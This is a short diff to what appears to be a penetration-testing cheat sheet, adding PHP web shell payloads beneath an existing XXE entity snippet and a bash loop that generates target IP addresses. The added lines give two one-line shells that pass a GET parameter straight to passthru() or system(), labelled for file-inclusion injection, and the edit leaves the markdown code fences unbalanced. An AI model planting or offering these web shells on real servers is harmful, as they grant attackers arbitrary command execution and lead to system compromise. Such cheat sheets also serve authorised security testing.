@@ -232,7 +232,16 @@ for ip in $(seq 200 254); do echo 1.2.3.${ip}; done > target-ip.txt
                 <something>&xxe;</something>
                 </foo>
 ```
+php cmd shell, basic shell php shell, FLI INJECTION SHELL.
 
+<?php echo passthru($_GET["cmd"]); ?>
+
+**<?php
+$cmd=$_GET['cmd'];
+system($cmd);
+?>**
+
+```
 ## Read binary or files that otherwise can't be display (.php)
 
 ```xml
